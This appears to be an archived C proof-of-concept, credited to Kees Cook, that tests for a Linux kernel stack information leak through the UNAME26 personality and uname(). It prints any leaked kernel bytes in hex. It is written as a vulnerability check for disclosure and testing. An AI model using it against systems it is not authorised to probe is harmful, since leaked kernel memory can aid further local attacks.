/*
source: https://www.securityfocus.com/bid/55855/info

The Linux kernel is prone to a local information-disclosure vulnerability.

Local attackers can exploit this issue to obtain sensitive information that may lead to further attacks.
*/

/* Test for UNAME26 personality uname kernel stack leak.
 * Copyright 2012, Kees Cook <keescook@chromium.org>
 * License: GPLv3
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/personality.h>
#include <sys/utsname.h>

#define UNAME26 0x0020000

int dump_uts(void)
{
	int i, leaked = 0;
	struct utsname buf = { };

	if (uname(&buf)) {
		perror("uname");
		exit(1);
	}
	printf("%s\n", buf.release);

	for (i = strlen(buf.release) + 1; i < sizeof(buf.release); i++) {
		unsigned char c = (unsigned char)buf.release[i];

		printf("%02x", c);
		if (c)
			leaked = 1;
	}
	printf("\n");

	return leaked ? (i - (strlen(buf.release) + 1)) : 0;
}

int main(int ac, char **av)
{
	int leaked;

	leaked = dump_uts();
	if (leaked) {
		printf("Leaked %d bytes even without UNAME26!?\n", leaked);
		return 1;
	}


	if (personality(PER_LINUX | UNAME26) < 0) {
		perror("personality");
		exit(1);
	}

	leaked = dump_uts();
	if (leaked) {
		printf("Leaked %d bytes!\n", leaked);
		return 1;
	} else {
		printf("Seems safe.\n");
		return 0;
	}
}